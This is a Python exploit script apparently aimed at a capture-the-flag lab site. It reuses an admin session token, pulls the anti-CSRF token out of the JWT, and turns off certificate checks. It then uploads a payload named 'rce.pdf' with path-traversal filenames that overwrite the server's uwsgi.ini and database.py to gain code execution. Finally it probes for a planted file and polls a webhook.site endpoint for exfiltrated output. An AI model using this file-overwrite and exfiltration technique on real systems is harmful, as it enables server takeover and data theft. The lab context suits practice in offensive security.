import base64
import json
import ssl
import time
import urllib.request
from http.cookiejar import Cookie, CookieJar
from pathlib import Path

BASE = "https://6393c42b8379.labs.ctfroom.com"
token = Path(r"C:\Users\HP\admin_session.txt").read_text().strip()
payload_b64 = token.split(".")[1]
payload_b64 += "=" * ((4 - len(payload_b64) % 4) % 4)
csrf = json.loads(base64.urlsafe_b64decode(payload_b64))["antiCSRFToken"]
print("csrf", csrf, flush=True)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
cj = CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPSHandler(context=ctx),
    urllib.request.HTTPCookieProcessor(cj),
)
cj.set_cookie(
    Cookie(
        0,
        "session",
        token,
        None,
        False,
        "6393c42b8379.labs.ctfroom.com",
        True,
        True,
        "/",
        True,
        False,
        None,
        False,
        None,
        None,
        {},
    )
)

pdf = Path(r"C:\Users\HP\rce.pdf").read_bytes()


def multipart(fields, files):
    bound = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    body = b""
    for k, v in fields.items():
        body += f"--{bound}\r\n".encode()
        body += f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode()
        body += v.encode() + b"\r\n"
    for k, (fname, data, ctype) in files.items():
        body += f"--{bound}\r\n".encode()
        body += (
            f'Content-Disposition: form-data; name="{k}"; filename="{fname}"\r\n'
        ).encode()
        body += f"Content-Type: {ctype}\r\n\r\n".encode()
        body += data + b"\r\n"
    body += f"--{bound}--\r\n".encode()
    return body, f"multipart/form-data; boundary={bound}"


def upload(filename):
    body, ctype = multipart(
        {"name": "pwn", "antiCSRFToken": csrf},
        {"file": (filename, pdf, "application/pdf")},
    )
    req = urllib.request.Request(
        BASE + "/challenge/api/addContract",
        data=body,
        headers={
            "Content-Type": ctype,
            "User-Agent": "Mozilla/5.0",
            "Cookie": f"session={token}",
        },
        method="POST",
    )
    with opener.open(req, timeout=60) as resp:
        return resp.read().decode()


print("uwsgi", upload("/app/uwsgi.ini"), flush=True)
print("database", upload("/app/application/database.py"), flush=True)
time.sleep(6)

for p in [
    "/static/pwn.txt",
    "/challenge/../static/pwn.txt",
    "/static/css/../pwn.txt",
]:
    try:
        req = urllib.request.Request(BASE + p, headers={"Cookie": f"session={token}"})
        with opener.open(req, timeout=15) as resp:
            data = resp.read()
            print(p, data[:300], flush=True)
    except Exception as e:
        print(p, type(e).__name__, e, flush=True)

# also check webhook
hook = Path(r"C:\Users\HP\hook_id.txt").read_text().strip()
try:
    with urllib.request.urlopen(
        f"https://webhook.site/token/{hook}/requests?sorting=newest&per_page=3", timeout=15
    ) as resp:
        print("webhook", resp.read()[:500], flush=True)
except Exception as e:
    print("webhook err", e, flush=True)

# verify admin access
req = urllib.request.Request(
    BASE + "/challenge/admin/contracts", headers={"Cookie": f"session={token}"}
)
with opener.open(req, timeout=30) as resp:
    html = resp.read().decode()
    print("contracts page", resp.status, "Contract" in html or "contract" in html.lower(), flush=True)
